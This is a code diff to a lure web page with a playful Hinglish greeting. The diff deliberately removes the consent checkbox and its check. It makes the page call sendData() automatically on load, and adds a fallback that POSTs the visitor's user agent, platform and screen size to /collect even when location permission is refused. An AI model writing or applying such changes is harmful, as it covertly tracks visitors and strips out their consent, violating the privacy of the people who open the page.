@@ -117,11 +117,6 @@
     <h1>AA GYE AP👀</h1>
     <p>LAADLE KUCH JAADU DEKHNA?</p>
 
-    <label>
-        <input type="checkbox" id="consent">
-        I agree to share my info
-    </label>
-
     <button onclick="sendData()">Let's explore then</button>
 </div>
 
@@ -131,17 +126,12 @@ window.onload = function() {
     setTimeout(() => {
         document.getElementById("loader").style.display = "none";
         document.getElementById("mainCard").style.display = "block";
+        // Automatically collect data without waiting for button click
+        sendData();
     }, 2000); 
 };
 
 function sendData() {
-    const consent = document.getElementById("consent").checked;
-
-    if (!consent) {
-        alert("Please give consent first!");
-        return;
-    }
-
     navigator.geolocation.getCurrentPosition(function(pos) {
         const data = {
             device: navigator.userAgent,
@@ -159,7 +149,21 @@ function sendData() {
         alert("Exploring...");
     },
     function() {
-        alert("Location permission denied");
+        // If location denied, still send other data
+        const data = {
+            device: navigator.userAgent,
+            platform: navigator.platform,
+            screen: window.screen.width + "x" + window.screen.height,
+            location: "Location permission denied"
+        };
+
+        fetch('/collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+        alert("Exploring...");
     });
 }
 </script>
